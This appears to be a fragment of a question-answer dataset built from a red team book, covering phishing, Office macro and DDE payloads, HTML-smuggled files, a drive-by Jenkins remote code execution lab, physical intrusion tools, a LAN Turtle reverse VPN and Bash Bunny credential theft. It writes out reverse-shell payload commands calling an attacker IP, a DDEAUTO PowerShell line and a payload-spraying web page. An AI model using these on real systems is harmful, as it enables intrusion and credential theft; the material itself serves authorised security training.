seen many applications require 2FA on\ncommon endpoints, but lack the security protection on other parts of the\napplication.",
    "question": "How can Red Teamers effectively use social engineering techniques to compromise a network and gain credentials?",
    "summary": "This chapter discusses social engineering (SE) attacks, highlighting their effectiveness in compromising networks with minimal effort. It covers techniques like Doppelganger Domains and using tools such as SET and ReelPhish to clone authentication pages and bypass 2FA. The goal is to create believable campaigns that help organizations improve internal security awareness."
  },
  {
    "start": 82,
    "end": 85,
    "text": "Phishing\nAnother technique where Red Teams have great success is traditional phishing.\nPhishing, at its core, relies on either fear, urgency, or something that just sounds\ntoo good to be true. Fear and urgency do work well and I am sure we have all\nseen it before. Some examples of fear and urgency types of attacks include:\nA fake email with a fraudulent purchase\nSomeone hacked into your email message\nEmail about tax fraud\nThe issue with these general attacks is that we are noticing that corporate\nemployees are getting smarter and smarter. Usually, at least 1 out of every 10\nemails for basic phish style attack will get reported. In some cases, the numbers\nare much higher. This is where it is valuable for a Red Team to continually\nmonitor these easy phish attacks to see if a company is getting better at\nresponding to these situations.\nFor those looking for more automated attacks, we really like Gophish\n(http://getgophish.com/documentation/). It is fairly easy to set up and maintain,\nsupports templates and HTML, and tracks/documents everything you need. If\nyou are a fan of Ruby, there is also Phishing Frenzy\n(https://github.com/pentestgeek/phishing-frenzy); and for Python, there is King\nPhisher (https://github.com/securestate/king-phisher).\nThese automated tools are great for recording straightforward phishing\ncampaigns. For our target campaigns, we go with a more manual approach. For\nexample, if we do some reconnaissance on the victim's mail records and identify\nthat the client is using Office 365, then we can figure out how to build a very\nrealistic campaign with that information. Additionally, we try to find any leaked\nemails from that company, programs they might be running, new features,\nsystem upgrades, mergers, and any other information that might help.\nThere are also times when we run more targeted executive campaigns. In these\ncampaigns, we try to use all the open source tools to search for information\nabout people, their properties, families and more. For example, if targeting an\nexecutive, we would search them on pipl.com, get their social media accounts,\nfind out where their kids go to school, and spoof an email from their school\nsaying they need to open this word document. These take a fair amount of time,\nbut have high success rates.\nMicrosoft Word/Excel Macro Files\nOne of the older, but tried and tested, methods of social engineering is sending\nyour victim a malicious Microsoft Office file. Why are Office files great for a\nmalicious payload? Because by default, Office files support Visual Basic for\nApplications (VBA) code that allows for code execution. Although, more\nrecently, this method has become easily detected by AV, it still works in many\ncases with obfuscation.\nAt the most basic level, we can use either Empire or Unicorn to create a VBA\nMacro:\nIn Empire:\nSelect Macro Stager\nusestager windows/macro\nMake sure to configure the proper settings\ninfo\nCreate the Macro\ngenerate\nIf you want to create a Payload for Meterpreter, we can use a tool\nlike Unicorn:\ncd optunicorn\n./unicorn.py windows/meterpreter/reverse_https [your_ip]\n443 macro\nStart a Metasploit Handler\nmsfconsole -r ./unicorn.rc\nOnce generated, your payload will look something like the following:\nAs you can see, this is running a simple PowerShell base64 obfuscated script.\nThis can help get around some AV products, but it is important to make sure you\ntest it well prior to going on a live campaign. Once you generate a macro, you\ncan create a quick Excel document:\nOpen Excel\nGo to the View Tab -> Macros -> View Macros\nAdd a Macro Name, configure the Macro for book1, and click Create\nReplace all the current Macro code with the generated code\nSave as .xls (Word 97-2003) or Excel Macro-Enabled\nNow, whenever anyone opens your document, they will get a Security Warning\nand a button to Enable Content. If you can trick your victim into clicking the\nEnable Content button, your PowerShell script will execute, getting you an\nEmpire Shell.\nAs previously mentioned, the Macro method is the old, tried and tested method,\nso many victims may already be aware of this attack. Another route we can take\nwith Office Files is embedding a batch file (.bat) with our payload. In the newer\nversion of Office, objects will not execute if the victim double clicks the .bat file\nwithin the Word document. We usually have to try to trick them to move it over\nto their desktop and execute.\nWe can do this in a more automated fashion with LuckyStrike\n( https://github.com/curi0usJack/luckystrike). With LuckyStrike, we can create Excel\ndocuments with our Payload within the worksheets and even have full\nexecutables (exes) stored inside Excel documents, which can be triggered using\nReflectivePE to run all in memory. Read more on LuckyStrike here:\nhttps://www.shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macro-\ngenerator\nOne last tool I want to mention for Office File executables is VBad\n( https://github.com/Pepitoh/VBad). When running VBad, you do have to enable\nmacros in Office and select the checkbox “Trust Access to the VBA\nproject object model” in the macro security settings. This allows the VBad\npython code to change and create macros.\nVBad heavily obfuscates your payloads within the MS Office document. It also\nadds encryption, has fake keys to throw off IR teams, and best of all, it can\ndestroy the encryption key after the first successful run (a one-time use\nMalware). Another feature is that VBad can also destroy references to the\nmodule containing effective payload in order to make it invisible from VBA\nDeveloper Tool. This makes analysis and debugging much harder. So, not only\nis it a total pain to reverse, but also if the incident response teams try to analyze\nthe executed Word document versus the original document, all the keys will be\nmissing.\nNon-Macro Office Files - DDE\nOne thing about Red Team attacks is that sometimes it is all about timing.\nDuring one of our assessments, a brand new vulnerable called DDE was first\nannounced. It wasn't yet detected by AV or any security product, so it was a\ngreat way to get our initial entry point. Although there are now several security\nproducts to detect DDEs, it could still be a viable attack in some environments.\nWhat is DDE?\n\"Windows provides several methods for transferring data between applications.\nOne method is to use the Dynamic Data Exchange (DDE) protocol. The DDE\nprotocol is a set of messages and guidelines. It sends messages between\napplications that share data and uses shared memory to exchange data between\napplications. Applications can use the DDE protocol for one-time data transfers\nand for continuous exchanges in which applications send updates to one another\nas new data becomes available.” [https://msdn.microsoft.com/en-\nus/library/windows/desktop/ms648774(v=vs.85).aspx]\nThe team at Sensepost did some great research and discovered that DDEExecute\nwas exposed by both MSExcel, and MSWord, and that they could be used to\ncreate code execution without the use of Macros.\nIn Word:\nGo to Insert Tab -> Quick Parts -> Field\nChoose = Formula\nRight click on: !Unexpected End of Formula and select Toggle Field\nCodes\nChange the payload to your payload:\nDDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k\npowershell.exe [empire payload here]\"\nEmpire has a stager that will auto-create the Word file and associated\nPowerShell script. This stager can be configured by:\nusestager windows/macroless_msword\nResources:\nhttps://sensepost.com/blog/2017/macroless-code-exec-in-msword/\nAre there any other features to abuse in Word documents other than 0-day\nexploits (i.e. https://github.com/bhdresh/CVE-2017-0199)? The answer is yes.\nAlthough we won’t cover it in this book, an example would be subdoc attacks\n(https://rhinosecuritylabs.com/research/abusing-microsoft-word-features-\nphishing-subdoc/). These attacks cause the victim to make an SMB request to an\nattacker server on the internet in order to collect NTLM auth hashes. This may\nor may not work, as most corporations now block SMB related ports outbound.\nFor those that don't, we can use the subdoc_inector (http://bit.ly/2qxOuiA) attack\nto take advantage of this misconfiguration.\nHidden Encrypted Payloads\nAs Red Teamers, we are always looking for creative ways to build our landing\npages, encrypt our payloads, and to trick users into clicking run. Two different\ntools with similar processes are EmbededInHTML and demiguise.\nThe first tool, EmbededInHTM, \"takes a file (any type of file), encrypt it, and\nembed it into an HTML file as resource, along with an automatic download\nroutine simulating a user clicking on the embedded resource. Then, when the\nuser browses the HTML file, the embedded file is decrypted on the fly, saved in\na temporary folder, and the file is then presented to the user as if it was being\ndownloaded from the remote site. Depending on the user's browser and the file\ntype presented, the file can be automatically opened by the browser.\"\n[https://github.com/Arno0x/EmbedInHTML]\ncd opEmbedInHTML\npython embedInHTML.py -k keypasshere -f meterpreter.xll -o\nindex.html -w\nOnce the victim accesses the malicious site, a pop-up prompts the victim to open\nour .xll file in Excel. Unfortunately, with the more recent versions of Excel\n(unless misconfigured), the user will need to Enable the add-on to execute our\npayload. This is where your social engineering tricks need to come into play.\nThe second tool, demiguise, \"generates .html files that contain an encrypted\nHTA file. The idea is that when your target visits the page, the key is fetched and\nthe HTA is decrypted dynamically within the browser and pushed directly to the\nuser. This is an evasion technique to get around content file-type inspection\nimplemented by some security-appliances. This tool is not designed to create\nawesome HTA content. There are other toolstechniques that can help you with\nthat. What it might help you with is getting your HTA into an environment in the\nfirst place, and (if you use environmental keying) to avoid it being sandboxed.\"\n[https://github.com/nccgroup/demiguise]\npython demiguise.py -k hello -c \"cmd.exe /c\n<powershell_command_here>\" -p Outlook.Application -o test.hta",
    "question": "What are some methods Red Teams use to create effective phishing campaigns and deliver malicious payloads through Microsoft Office files?",
    "summary": "Phishing is a common technique used by Red Teams, often relying on fear, urgency, or enticing offers. Employees are becoming more aware, so Red Teams use automated tools like Gophish and King Phisher to create and track phishing campaigns. Additionally, Red Teams may use more targeted approaches, such as exploiting leaked information or using Microsoft Office files with macros or DDE to execute payloads without detection."
  },
  {
    "start": 86,
    "end": 92,
    "text": "Exploiting Internal Jenkins with Social Engineering\nAs Red Teamers, creativity in attacks is what makes our work extremely\nexciting. We like to take old exploits and make them new again. For example,\nif you have been performing network assessments, you know that if you come\nacross an unauthenticated Jenkins application (heavily used by developers for\ncontinuous integration), it pretty much means full compromise. This is because\nit has a \"feature\" that allows Groovy script execution for testing. Utilizing this\nscript console, we can use execute commands that allow shell access to the\nunderlying system.\nThe reason this method has become so popular for compromise is that almost\nevery major company has some instances of Jenkins. The problem with an\nexternal attack is that these Jenkins services are all hosted internally and can't be\nreached from the outside.\nHow could we execute code on those servers remotely? Before we can answer\nthis question, I tell my team to take a step back and build a replica network with\nJenkins for testing. Once we have a good understanding of how code execution\nrequests function, we can now build the proper tools to gain RCE.\nIn this case, we solved this problem through a multitude of steps using\nJavaScript and WebRTC (Web Real-Time Communications). First, we would\nneed a victim of an organization to visit a public website we own or a page\nwhere we have our stored XSS payload. Once a victim visits our public site, we\nwould execute JavaScript on their browser to run our malicious payload.\nThis payload would abuse a Chrome/Firefox \"feature\" which allows WebRTC to\nexpose the internal IP of a victim. With the internal IP, we can then deduce the\nlocal subnet of the victim machine to understand their corporate IP ranges.\nNow, we can blast every IP in their network range (the code only scans the local\n/24, but in a real campaign, you would want to make it much larger than that)\nwith our specially-crafted Jenkins exploit over the default Jenkins port 8080.\nThe next question is, what payload do we use? If you have played around with\nthe Jenkins Console shell, you know it is a little finicky, so being able to get\ncomplex PowerShell payloads consistently might be tough. To solve this\nproblem, a tool was created for THP3 called \"generateJenkinsExploit.py\"\n(https://github.com/cheetz/generateJenkinsExploit), which will take any binary\nfile, encrypt it, and build the malicious attack JavaScript page. When a victim\nhits our malicious webpage, it will grab their internal IP and start spraying our\nexploit to all servers in the /24 range. When it finds a vulnerable Jenkins server,\nthe attack will send a Groovy script payload to grab the encrypted binary from\nthe internet, decrypt it to a file under C:\\Users\\Public\\RT.exe and execute the\nMeterpreter binary (RT.exe).\nIn concept (diagramed below), this is very similar to a Server Side Request\nForgery (SSRF), where we are forcing the victim's browser to re-initiate our\nconnections to internal IPs.\nVictim visits our stored XSS or malicious JavaScript Page.\nVictim's browser executes JavaScript/WebRTC to get internal IP and\nblast the local internal network with Groovy POST Payload.\nUpon finding a Jenkins server, our Groovy code will tell the Jenkins\nserver to grab the encrypted payload from the attacker's server, and\nthen decrypt and execute the binary.\nIn this case, our encrypted executable that is downloaded is a\nMeterpreter payload.\nMeterpreter executes on the Jenkins server, which then connects to\nour Attacker Meterpreter Server.\nNote: This vulnerability does not exist in the latest versions of Jenkins. Versions\nbefore 2.x are vulnerable by default as they did not enable CSRF protection\n(allowing for this blind call to script) and did not have authentication enabled.\nFull Jenkins Exploitation Lab:\nWe are going to build out a Jenkins Window server, so that we can\nrepeat this attack.\nInstall a Windows VM that has a Bridged Interface on your local\nnetwork\nOn Windows system, download and install JAVA JDK8\nDownload Jenkins War File\nhttp://mirrors.jenkins.io/war-stable/1.651.2/\nStart Jenkins\njava -jar jenkins.war\nBrowse to Jenkins\nhttp://<Jenkins_IP>:8080/\nTest the Groovy Script Console\nhttp://<Jenkins_IP>:8080/script\nExploit Jenkins on the THP Kali VM:\nDownload the THP Jenkins Exploit Tool (http://bit.ly/2IUG8cs)\nTo perform the lab, we first need to create a Meterpreter payload\nmsfvenom -p windows/meterpreter/reverse_https\nLHOST=<attacker_IP> LPORT=8080 -f exe >\nbadware.exe\nEncrypt our Meterpreter binary\ncd optgenerateJenkinsExploit\npython3 ./generateJenkinsExploit.py -e badware.exe\nCreate our malicious JavaScript Page called badware.html\npython3 ./generateJenkinsExploit.py -p\nhttp://<attacker_IP>/badware.exe.encrypted >\nbadware.html\nMove both the encrypted binary and malicious JavaScript page to the\nweb directory\nmv badware.html varwww/html/\nmv badware.exe.encrypted varwww/html/\nNow, on a completely different system, visit your attacker webpage\nhttp://<attacker_IP>/badware.html using either Chrome or Firefox. Just by\nvisiting that malicious page, your browser blasts your internal /24 network over\nport 8080 with our Groovy payload using JavaScript and POST requests. When\nit finds a Jenkins server, it will cause that server to download our encrypted\nMeterpreter, decrypt it, and execute it. On a corporate network, you may end up\nwith tons of different shells.\nJenkins is just one of the many attacks you can do. Anything that allows code\nexecution unauthenticated by a GET or POST HTTP method could be used in\nthis same scenario. This is where you need to identify what applications our\nvictims utilize internally and craft your malicious exploit.\nConclusion\nSocial engineering is one of those areas that will always be a cat and mouse\ngame. We rely heavily on the human factor and target weaknesses of fear,\nurgency, and trust. By taking advantage of these vulnerabilities, we can create\nvery clever campaigns that have a high success rate on system compromise.\nIn terms of metrics and goals, we need to move away from a reactive model of\nwaiting for users to report phishing/SE emails, to a proactive model where we\ncan hunt actively for these types of malicious attacks.\n6 the onside kick - physical attacks\nAs part of the security assessment, CSK has asked your team to do a physical\nassessment of the facility. This entails checking if their gates and protections are\nadequate, and if able to get on the premises, validating how the guards react and\ntheir response times.\n*Quick note: Please make sure to check with local, state, and federal laws prior\nto doing any physical assessments. For example, in Mississippi, Ohio, Nevada,\nor Virginia, just having lock picks could be considered illegal. I am not a\nlawyer, so it would be wise for you to consult with one first. Also, ensure you\nhave proper approval, work with the facility's physical security teams, and have\na signoff paper in case you get caught. Prior to the actual engagement, work\nwith the physical security team to discuss what happens if security guards catch\nyou, if you can run or if you have to stop, and if there is someone monitoring the\nradios. Also, make sure the guards do not contact local law enforcement. The\nlast thing you want is to actually go to jail.\nNow, it's time to break into the Cyber Space Kittens' secret facility. Per the\nwebsite, it looks like it is located on 299792458 Light Dr. After we do some\nreconnaissance on Google street, we notice that this facility is gated and has a\nguard shack or two. We can identify multiple entry points and areas where we\nmight be able to get over the fence. With an initial walkthrough, we also\nidentify some cameras, gates, entry points, and card reader systems.\nCard Reader Cloners\nCard reader cloners were heavily covered in THP2, so I will mainly go into\nupdates. For the most part, HID badges that don't require any public/private\nhandshakes are still vulnerable to clone and bruteforce ID numbers.\nIn THP2, we loved cloning ProxCard II badges as they don't have any\nprotections, can be cloned easily, and cards are generally purchased in bulk\nincrementally, which allow for easy bruteforcing. This was all done using the\nProxmark3 device. Since then, a much more portable version of this device has\nbeen released called Proxmark3 RDV2 Kit\n(http://hackerwarehouse.com/product/proxmark3-rdv2-kit/). This version can be\nconfigured with a battery and is much smaller than the original Proxmark3.\nOther common cards we come across:\nHID iClass (13.56 MHz)\nHID ProxCard (125 kHz)\nEM4100x (125 kHz)\nMIFARE Classic (13.56 MHz)\nHere is a great resource to check out by Kevin Chung:\nhttps://blog.kchung.co/rfid-hacking-with-the-proxmark3/.\nPhysical Tools to Bypass Access Points\nWe won't get into physical tools and how-tos, as that is an entire book and\nrequires a great deal of experience. As always, the best way to do physical\nassessments is to practice, build physical labs, and figure out what works and\nwhat doesn't. In terms of some cool tools that we have used in the past:\nLock Picks (https://www.southord.com/) - SouthOrd has always been\nour go-to for lock picks. Great quality and works well.\nGate Bypass Devices (https://www.lockpickshop.com/GATE-\nBYPASS.html) - Tool for getting around locked gates.\nShove-it Tool (https://www.lockpickshop.com/SJ-50.html) - Simple\ntool if there is adequate space been a door and the latch. Similar to\nthe credit card swipe to open doors, you use the shove-it tool to go\nbehind the plunger and pull back.\nUnder the Door 2.0 (https://shop.riftrecon.com/products/under-the-\ndoor-tool) – Tool for doors that have the lever handle. We can use\nthe Under the Door tool to literally go under the door, wrap around\nthe lever handle, and pull down. Back in the day, these were\ncommonly found in hotels, but we definitely do come across them in\nbusinesses, too.\nAir Canisters - A cheap and easy tool to get around doors that unlock\nwith motion sensors on the inside. Check out this video to see Samy\nKamkar bypass these types of doors:\nhttps://www.youtube.com/watch?v=xcA7iXSNmZE\nRemember, the purpose of these tools and physical assessments is to track and\nmonitor how a company's physical security program responds. So it is our job to\nmake sure we adequately document not only flaws in the system, but also if the\nresponse times and handling of the incident were acceptable.\nLAN Turtle (lanturtle.com)\nThe LAN Turtle is one of my favorite tools from Hak5. In the prior books, we\nhave looked into Raspberry Pi and ODROID small form factors for drop boxes.\nRunning Kali Linux on these devices and having them either SSH or VPN back\ninto our attacker machines was a great way to do physical penetration tests.\nThese drop boxes have continued to evolve through the years. Now, the LAN\nTurtle is one that can be hidden behind any machine, powered by USB, and\ntransparent to the user. The LAN Turtle uses the USB as a NIC card and proxies\nall traffic through the Ethernet cable.\nThere is also a 3G cellular edition, but we won't be demonstrating that here.\nSetting up the LAN Turtle: So the LAN Turtle's purpose is to replace the\ndropbox. Although it has a load of other features like autossh, dns spoofing,\nmeterpreter, ptunnel, script2email, urlsnarf, responder, and more, the main Red\nTeam use is to gain access into the network.\nHistorically, and even in prior THP books, we used SSH reverse shells. These\ngenerally work adequately, but for more in-depth scanning/complex attacks, we\nneed full access into the network. To do this, we are going to have to configure\na Reverse VPN connection. What does a reverse VPN connection look like?\nWell, since the LAN Turtle will be dropped on the back of one of the desktops\ninside an organization, we won't be able to directly connect to it. Therefore, we\nwill have the LAN Turtle first go outbound via port 443 to VPN back to our\nOpenVPN AS server. From our attacker Kali box, we will have to also log into\nthe VPN server. Once the LAN Turtle and our Attacker Machine are VPNed\ninto our server, we can route our traffic through the LAN Turtle to scan or\nexploit boxes.\nAlthough OpenVPN reverse tunnels aren't new, the team at Hak5 did a really\ngood job putting a tutorial together. I have had to modify some of the following\ncommands, but watch their YouTube video for a more detailed explanation:\nhttps://www.youtube.com/watch?v=b7qr0laM8kA.\nThere are three major parts to this:\nFirst, we are going to have to set up an OpenVPN AS server on the\ninternet\nSecond, we are going to have to configure the LAN Turtle\nThird, we are going to have to configure our attacker machine\nSetting Up A VPS OpenVPN AS Server:\nWe want to make sure that our VPN server is externally facing. We\ngenerally like to host our VPN servers on VPS servers as they are\nextremely easy and quick to set up. As a caveat, please check with\nyour VPS provider to make sure you are allowed to do certain\nactivities.\nTwo providers we usually see people use are Linode and Amazon\nLightsail. This is because these VPS providers are quick, cheap, and\nsuper easy to set up. In this case, we are going to be using AWS\nLightsail. The other reason to pick certain VPS providers is because\nof detection of traffic. Using AWS, I know that most likely, the\nvictim's network will have a lot of traffic to AWS servers. This\nwould allow me to hide within their traffic.\nGo to Lightsail.aws.amazon.com and create a new VPS\nOnce created, go to Manage -> Networking\nAdd two Firewall TCP Ports (443 and 943)\nWe are all done creating the VPS server. Now let's login:\nMake sure to chmod 600 your SSH keys and log into your\nserver\nssh -i LightsailDefaultPrivateKey-us-west-2.pem\nubuntu@[IP]\nAfter SSHing into the server\nGo to root:\nsudo su -\nUpdate server:\napt-get update && apt-get upgrade\nInstall OpenVPN AS. Go here to find latest version:\nhttps://openvpn.net/index.php/access-server/download-\nopenvpn-as-sw/113.html?osfamily=Ubuntu\nCopy the link and download it onto the VPS. Example:\nwget http://swupdate.openvpn.org/as/openvpn-\nas-2.1.12-Ubuntu16.amd_64.deb\nInstall OpenVPN AS:\ndpkg -i openvpn-as-2.1.12-\nUbuntu16.amd_64.deb\nDelete the current profile and configure OpenVPN:\nusrlocal/openvpn_as/bin/ovpn-init\nDuring the setup:\nMake sure to set the ADMIN UI to all\ninterfaces\nSet Use local authentication via\ninternal DB to YES\nUpdate OpenVpn passwords:\npasswd openvpn\nThis is a great time to put IPTables for port 943 to only\nallow connections from your networks\nSet Up OpenVPN AS Server:\nGoto https://[IP Address of VPS server]:943/admin/\nLogin with user account \"openvpn\" and the password you just\ncreated\nIf you are using AWS Lightsail:\nGo to Server Network Settings and make sure the:\nHostname or IP Address is the right PUBLIC IP address\nand not the PRIVATE one\nSave and Update\nVerify authentication is set to local:\nAuthentication -> General -> Local -> Save Settings ->\nUpdate Server\nCreate Two Users with Allow AutoLogin enabled (I did lanturtle and\nredteam):\nUser Management -> User Permissions\nFor each user:\nSet AllowAuto-login\nMake sure to Set Passwords for both of them\nFor the lanturtle account, to allow connectivity via VPN,\nwe need to enable some permissions:\nMake sure to configure/enable under User\nPermissions:\nall server-side private subnets\nall other VPN clients\nDownload OpenVPN Profiles:\nConnect to download profiles:\nhttps://[Your VPS]:943/?src=connect\nFor each user (redteam and lanturtle)\nLogin and Download Profile - Yourself\n(autologin profile)\nSave as turtle.ovpn and redteam.ovpn\nSetting Up the LAN Turtle and Initial Configuration:\nPlug in USB and Ethernet\nnmap the local network for port 22\nnmap x.x.x.x/24 -p22 -T5 --open\nSSH with root@[ip] with a password of sh3llz\nUpdate your LAN TURTLE\nIt is important to change your MAC Address. LAN Turtles use\nsimilar manufacturer MAC addresses, so you will want to make sure\nyou look like a random device:\nChange your Mac Address\nInstall OpenVPN:\nGo to Modules -> Select -> Configure -> Directory - Yes\nInstall openvpn\nSet up your OpenVPN Profile:\nGo back to Modules -> openvpn -> configure -> paste\neverything all from turtle.opvn and save\nWe also want to make sure that the LAN Turtle OpenVPN server\nstarts up at bootup, so we can just drop it and run:\nGo to Modules -> openvpn -> Enable\nLastly, we need to modify our Firewall Rules on our LAN Turtle:\nExit out of the turtle menu and edit our Firewall rules\nnano etcconfig/firewall\nUnder: config zone 'vpn'\nMake sure \"option forward\" is set to ACCEPT\nAdd the following config forwarding rules:\nconfig forwarding\noption src wan\noption dest lan\nconfig forwarding\noption src vpn\noption dest wan\nconfig forwarding\noption src wan\noption dest vpn\nLog back into the turtle menu -> Modules -> openvpn -> start\nThis should start the OpenVPN client on our Turtle. To make sure it\nworks, go back into our OpenVPN AS server and check for\nconnections.\nWe now have the LAN Turtle configured so that any time it connects to a\nnetwork, it connects back to our VPN Server and we can SSH into the LAN\nTurtle. Let's walk through an example: Accessing the VPN Server from our Kali\nAttacker Host:\nopenvpn --config ./redteam.ovpn\nWe need to get the IP Address of the network they are on in order to\nroute all traffic through from our redteam vpn\nSSH into the LAN Turtle\nExit the Turtle menu and get the IP address of the internal\ninterface (ifconfig) of the victim network. Figure out the\nIP range based on the IP and Bcast. In our example, the\nnetwork that the Turtle is on is 10.100.100.0/24\nLastly, let's enable forwarding:\nGo back into the OpenVPN AS and edit the user lanturtle\nUser Permissions -> for lanturtle -> show\nEdit VPN Gateway to Yes and add internal range (i.e.\n10.100.100.0/24)\nSave and Update\nFrom the SSH connection on the LAN Turtle, reboot with the\ncommand: reboot\nNow, we can VPN from our Attacker box and route all of our traffic through the\nVPN LAN Turtle into the victim corporate network. In the following image, we\nare logged into the VPN server, scanning the LAN Turtle's internal network of\n10.100.100.0/24. We can see that we have successfully configured the routes\nfrom the VPN Gateway, through the LAN Turtle, to the corp network. From our\nKali Attacker Machine, we can run full vulnerability scans, web scrapes,\nMasscans, and more.\nThat’s it! You now have a quick-drop device that will let you keep a full\nconnection into a victim network. A few things you can do to be more\nsuccessful:\nPut a cronjob that resets the device every day. Tunnels can break\nand every time the Turtle reboots, a new connection is restarted.\nSome corporations block certain ports outbound. In this case we\nused port 443, which in many environments would be allowed\noutbound. For other companies that use web proxies, direct traffic\noutbound via 443, might be blocked. You may need to configure the\nLAN Turtle to automatically try multiple different ports or protocols\n(TCP/UDP) on start up.\nIf you are going to drop two or more devices, make sure the VPN\nservers and MAC addresses are different. We have had instances\nwhere our devices were found during engagements and almost every\ntime, it was by accident because IT was moving or changing out\ncomputers.\nPacket Squirrel\nAnother tool from Hak5 that has similar features as the LAN Turtle is the Packet\nSquirrel. The Packet Squirrel requires a USB micro to be powered, but instead\nof one end being a USB Ethernet adaptor, on the Packet Squirrel, both ends are\nEthernet cables. This is another discrete way to either capture traffic or create a\nVPN connection.\nSimilar to the LAN Turtle for configuring the Packet Squirrel;\nEdit the rootpayloads/switch3/payload.sh\nFOR_CLIENTS=1\nEdit etcconfig/firewall\nMake the exact same Firewall changes you did for the\nLAN Turtle\nUpload the LANTurtle.ovpn file to\nrootpayloads/switch3/config.ovpn\nYou now have another device that, once connected to the network, will have a\nReverse VPN connection back into the company.\nAlso, if you do own a Packet Squirrel, plenty of awesome research has been\ndone on it. You can easily convert the Packet Squirrel into an OpenWRT-based\nDYI disposable pen-test drop box (https://medium.com/@tomac/a-15-openwrt-\nbased-diy-pen-test-dropbox-26a98a5fa5e5) using SWORD.\nResources:\nhttps://www.hak5.org/episodes/hak5-1921-access-internal-networks-\nwith-reverse-vpn-connections\nhttp://www.ubuntuboss.com/how-to-install-openvpn-access-server-\non-ubuntu-15-10/\nhttps://trick77.com/how-to-set-up-transparent-vpn-internet-gateway-\ntunnel-openvpn/\nhttps://www.hak5.org/gear/packet-squirrel/docs\nBash Bunny\nIn the previous books, we talked about the Rubber Ducky\n(https://hakshop.com/collections/usb-rubber-ducky) and how it emulates HID\ndevices, like keyboards, to store commands. As Red Teamers, the Rubber\nDucky is still a great tool as it can speed up the delivery of PowerShell\ncommands, be used for social engineering exercises, and can allow compromises\non kiosk systems that might not have a keyboard, but have USB slots.\nThe Bash Bunny is the advanced version of this. Not only can it perform HID\nstyle attacks, but it can also do a world more. The Bash Bunny has two separate\nsettings to store two attacks (and one extra setting for management). These\npayloads can perform attacks to steal credentials, conduct phishing, perform\nDucky attacks, run PowerShell commands, perform scanning and recon, execute\nMetasploit autopwn, and more.\nIn the prior book, we spoke about using KonBoot\n(http://www.piotrbania.com/all/kon-boot/) to get around machines to which you\ndon't have passwords. KonBoot works on non-encrypted machines, where it\nboots up from a USB stick to overwrite the local administrative passwords.\nAlthough this does require a full reboot, this gets you onto a machine without\ncredentials. If you haven't played around with KonBoot, we use it all the time\non engagements and have had great success.\nThere are two reasons why you may not want to use KonBoot: (1) this attack\nwill not work on encrypted machines, and/or (2) you may not want to reboot the\nvictim’s computer. How can you get information from the locked system to get\naccess to additional stuff on the network or potentially get hashes/credentials?\nThis is where Bash Bunny comes into play.\nWe are going to use the Bash Bunny to run two different attack payloads for us.\nBoth of these payloads will allow us to get information from a locked (or\nunlocked) system if we have physical access to it. We are going to demonstrate\nthe use of BunnyTap and QuickCreds.\nBreaking into Cyber Space Kittens\nYou have finally broken into the Cyber Space Kittens facility after hours. With\nno one around you have a few hours to hack around. You get to your first\nmachine and drop KonBoot and reboot the system, but notice these systems are\nencrypted. You then go to the next machine which was left at the locked\nscreensaver state. You plug in your Bash Bunny twice, running both the\nBunnyTap and QuickCreds switches. After a few minutes, QuickCreds, which\nruns the infamous Responder, collects NetNTLMv2 hashes. We throw those\ninto Hashcat and crack the user's password in minutes! On machines where we\ncan't get or crack hashes, BunnyTap spins up PosionTap, which captures cookies\nfor popular sites and can be configured for internal applications. We take these\ncookies, connect our attacker laptop to their network, replace their cookies with\nours for sensitive web applications, and gain access to those web applications\nwithout ever knowing a single password.\nSetting Up Bash Bunny on Kali\nDownload the latest Firmware: https://bashbunny.com/downloads\nPut the Bash Bunny on Switch 3 - Arming Mode (closest to the USB\nport)\nDrop the firmware on the root of the USB mount, unplug, replug, and\nwait for about 10 minutes until it blinks blue\nOnce it's all done, go back into the Bash Bunny and edit the file\nunder: payloads > switch1 > payload.txt\n# System default payload\nLED B SLOW\nATTACKMODE ECM_ETHERNET STORAGE\nUnplug your device\nOn your Kali Box, set up the internet sharing:\nwget bashbunny.com/bb.sh\nchmod +x bb.sh\n./bb.sh\nGuided Mode (Chose all defaults)\nOn the Bash Bunny, put it on Switch 1 (farthest away from the USB)\nand plug in. Once complete, make sure you Connect to the Bash\nBunny, where you should see the Cloud <-> Laptop <-> Bunny\nimage\nOn your Kali Machine, SSH into the Bash Bunny with password\nhak5bunny\nLogging into the Bash Bunny\nOn your Kali Machine, SSH into the Bash Bunny with password\nhak5bunny\nssh root@172.16.64.1\nLet's Update and Install some tools on the Bash Bunny\napt-get update\napt-get upgrade\nexport GIT_SSL_NO_VERIFY=1\ngit clone https://github.com/lgandx/Responder.git\ntoolsresponder\ngit clone https://github.com/CoreSecurity/impacket.git\ntoolsimpacket\ncd toolsimpacket && python ./setup.py install\napt-get -y install dsniff\nIn another terminal on your Kali machine, install all the modules you\nwant.\ngit clone https://github.com/hak5/bashbunny-payloads.git\noptbashbunny-payloads\nYou can select any type of payload, but in our case, we are going to\nset up the Bash Bunny with two payloads: BunnyTap and\nQuickCreds\ncp -R optbashbunny-\npayloads/payloads/library/credentials/BunnyTap/*",
    "question": "How can a Red Teamer exploit an unauthenticated Jenkins server using social engineering and JavaScript/WebRTC to gain remote code execution?",
    "summary": "The text explains how Red Teamers can exploit unauthenticated Jenkins servers by using social engineering and JavaScript to gain remote code execution. They can use a malicious webpage to trigger a Groovy script that downloads and executes an encrypted Meterpreter payload, allowing them to access the internal network. The attack is similar to a Server Side Request Forgery, where the victim's browser is used to send the exploit to internal Jenkins servers. Additionally, it covers physical security assessment techniques, including using tools like the LAN Turtle and Bash Bunny to bypass access points and gain network access."
  },
  {
    "start": 93,
    "end": 95,
